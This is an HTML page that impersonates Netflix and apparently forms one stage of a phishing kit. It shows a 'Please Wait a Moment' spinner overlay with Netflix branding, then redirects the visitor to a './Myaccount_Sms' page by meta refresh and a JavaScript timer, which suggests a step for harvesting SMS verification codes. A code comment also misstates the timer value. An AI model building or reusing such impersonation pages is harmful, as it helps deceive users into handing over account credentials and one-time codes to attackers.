<html><head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" content="">
<meta content='20; url=./Myaccount_Sms' http-equiv='refresh'/>

<title>Netflix</title>


<link type="text/css" rel="stylesheet" href="./style/css/stylef.css"/>










<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/style.js"></script>


<script> 
$(document).ready(function(){
    $("#aaddcpis").click(function(){
        $("#mySidenav").show();
                    $("#hdikbdya").hide();
    });
});
</script>
 



<script> 
$(document).ready(function(){
    $("#sircardlya").click(function(){
        $("#mySidenav").show();
                    $("#hdikbdya").hide();

    });
});
</script>




<link type="text/css" rel="stylesheet" href="./style/css/nonechaditk.css"/>



<meta content="" name="description">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">



<link rel="shortcut icon" href="./style/css/nficon2016.ico">
<link rel="apple-touch-icon" href="./style/css/nficon2016.png">




<meta property="og:description" content="">
<meta property="al:ios:url" content="">
<meta property="al:ios:app_store_id" content="">
<meta property="al:ios:app_name" content="Netflix">
<meta property="al:android:url" content="">
<meta property="al:android:package">
<meta property="al:android:app_name" content="Netflix">
<meta name="twitter:card" content="player">
<meta name="twitter:site" content="@netflix">


</head>
<body>

<script type="text/javascript">
(function(){
   setTimeout(function(){
     window.location="./Myaccount_Sms";
   },25000); /* 25000 = 1 second*/
})();
</script>



<div id="spuenndr" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" >
<span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner center-absolute" style="width: 115px; height: 115px;"></div></div></div>



<div id="fixed" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.7;filter: alpha(opacity=50);" ><span style="font-size: 247.6px;margin-left: -124.8px;margin-top: -124.8px;left: 50%;font-size: 28.8vw;margin-left: -14.4vw;margin-top: -14.4vw;"></span><div class="waitIndicator"><div class="basic-spinner basic-spinner-light center-absolute" style="width: 115px; height: 115px;"></div>




</div>

<center>
<H2 style=" margin: 500px 2px 2px 2px;
    color: #ffffff;
">Please Wait a Moment ... </H2>
</center>


</div>







</div><div></div></div></div></body></html>